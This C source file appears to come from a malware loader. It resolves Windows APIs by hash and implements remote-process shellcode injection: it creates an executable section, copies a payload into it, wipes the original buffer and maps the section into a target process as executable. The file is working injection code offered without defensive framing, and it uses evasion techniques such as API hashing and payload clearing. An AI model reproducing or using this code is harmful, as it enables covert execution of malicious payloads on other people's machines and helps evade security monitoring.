#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"








BOOL memory_load_apis() {

	g_ldr->apis->OpenProcess = (pOpenProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_OPENPROCESS);
	g_ldr->apis->NtCreateSection = (pNtCreateSection)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCREATESECTION);
	g_ldr->apis->NtMapViewOfSection = (pNtMapViewOfSection)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTMAPVIEWOFSECTION);
	g_ldr->apis->NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTUNMAPVIEWOFSECTION);
	g_ldr->apis->NtCloseHandle = (pNtCloseHandle)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCLOSE);

	return g_ldr->apis->OpenProcess && g_ldr->apis->NtCreateSection
		&& g_ldr->apis->NtMapViewOfSection && g_ldr->apis->NtUnmapViewOfSection
		&& g_ldr->apis->NtCloseHandle;
}


MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
    MemoryInfo memInfo = { 0 };

    DWORD pid;
    HANDLE hProc = resolve_target_process(&pid);
    if (!hProc) {
        DBGA("[!] Failed resolving target process\n");
        memInfo.ok = FALSE;
        return memInfo;
    }

    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { .QuadPart = PayloadSize };
    NTSTATUS status = g_ldr->apis->NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) {
        DBGA("[!] NtCreateSection failed | 0x%lx\n", status);
        memInfo.ok = FALSE;
        return memInfo;
    }

    PVOID local = NULL;
    SIZE_T localSize = 0;
    status = g_ldr->apis->NtMapViewOfSection(
        hSection, (HANDLE)-1, &local, 0, 0, NULL,
        &localSize, 2, 0, PAGE_READWRITE);
    if (status != 0) {
        DBGA("[!] NtMapViewOfSection (local) failed | 0x%lx\n", status);
        g_ldr->apis->NtCloseHandle(hSection);
        memInfo.ok = FALSE;
        return memInfo;
    }

    DBGA("[*] Local Mapped Address 0x%p\n", local);
    memcpy(local, PayloadAddress, PayloadSize);
    clear_payload(PayloadAddress, PayloadSize);

    // map RX into remote process
    PVOID remote = NULL;
    SIZE_T remoteSize = 0;
    status = g_ldr->apis->NtMapViewOfSection(
        hSection, hProc, &remote, 0, 0, NULL,
        &remoteSize, 2, 0, PAGE_EXECUTE_READ);
    if (status != 0) {
        DBGA("[!] NtMapViewOfSection (remote) failed | 0x%lx\n", status);
        g_ldr->apis->NtUnmapViewOfSection((HANDLE)-1, local);
        g_ldr->apis->NtCloseHandle(hSection);
        memInfo.ok = FALSE;
        return memInfo;
    }

    DBGA("[*] Remote Mapped Address 0x%p in PID %lu\n", remote, pid);

    g_ldr->apis->NtUnmapViewOfSection((HANDLE)-1, local);
    g_ldr->apis->NtCloseHandle(hSection);

    memInfo.ShellCodeAddress = remote;
    memInfo.BytesWrote = PayloadSize;
    memInfo.remoteProcess = hProc;
    memInfo.ok = TRUE;

    return memInfo;
}

